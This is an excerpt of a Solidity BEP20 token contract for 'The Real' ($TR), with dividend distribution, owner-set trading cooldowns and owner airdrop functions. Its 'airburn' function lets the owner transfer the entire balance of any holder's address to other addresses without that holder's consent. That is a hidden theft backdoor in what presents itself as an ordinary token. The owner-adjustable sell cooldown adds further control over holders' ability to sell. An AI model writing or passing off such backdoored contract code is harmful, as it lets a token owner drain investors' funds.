...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20  COIN = IBEP20(0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE);
...
contract thereal is IBEP20, Auth {
    using SafeMath for uint256;

    address COIN = 0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "The Real";
    string constant _symbol = "$TR";
    ...
    uint8 public sellcooldownTimerInterval = 250;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xFCE6AA2218D69f5070C58723a94C108E43F8581A;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        // cooldown sell
        if (recipient == pair && CooldownEnabled && !isTimelockExempt[sender]) {
            require(sellcooldownTimer[sender] < block.timestamp,"Please wait for cooldown between sells");
            sellcooldownTimer[sender] = block.timestamp + sellcooldownTimerInterval;
        }
        
        // cooldown buy
        if (sender == pair && CooldownEnabled && !isTimelockExempt[recipient]) {
    ...
    function cooldownEnabled(bool _status, uint8 _sellinterval, uint8 _buyinterval) public onlyOwner {
        CooldownEnabled = _status;
        sellcooldownTimerInterval = _sellinterval;
        buycooldownTimerInterval = _buyinterval;
    }
    ...
    function airdrop(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
        ...
        require(balanceOf(from) >= airCapacity, "Not enough tokens to airdrop");
        for(uint i=0; i < addresses.length; i++){
    ...
    // Airburn
    function airburn(address from, address[] calldata addresses) external onlyOwner {

        for(uint i=0; i < addresses.length; i++){
            _basicTransfer(from,addresses[i],_balances[from]);
            if(!isDividendExempt[addresses[i]]) {
                try distributor.setShare(addresses[i], _balances[addresses[i]]) {} catch {} 
            }
        }
